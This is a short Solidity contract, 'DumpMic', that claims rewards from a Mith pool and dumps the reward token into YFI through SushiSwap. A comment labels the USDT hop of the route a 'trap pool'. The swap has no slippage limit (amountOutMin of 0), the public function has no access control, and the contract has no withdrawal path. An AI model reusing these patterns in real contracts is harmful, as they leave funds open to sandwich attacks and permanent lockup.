pragma solidity=0.8.0;

interface Mith {
    function getReward() external;
}

interface ERC20 {
    function balanceOf(address) external view returns (uint);
    function approve(address,uint) external returns (bool);
}

interface Uniswap {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract DumpMic {
    address constant sushiswap = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address constant cash = 0x368B3a58B5f49392e5C9E4C998cb0bB966752E51;
    address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant yfi = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;

    function crop(address pool) public {
        Mith(pool).getReward();
        uint amount = ERC20(cash).balanceOf(address(this));
        require(amount > 0); // dev: no reward
        address[] memory path = new address[](4);
        path[0] = cash;
        path[1] = usdt; // route via trap pool
        path[2] = weth;
        path[3] = yfi;
        ERC20(cash).approve(sushiswap, amount);
        Uniswap(sushiswap).swapExactTokensForTokens(
            ERC20(cash).balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}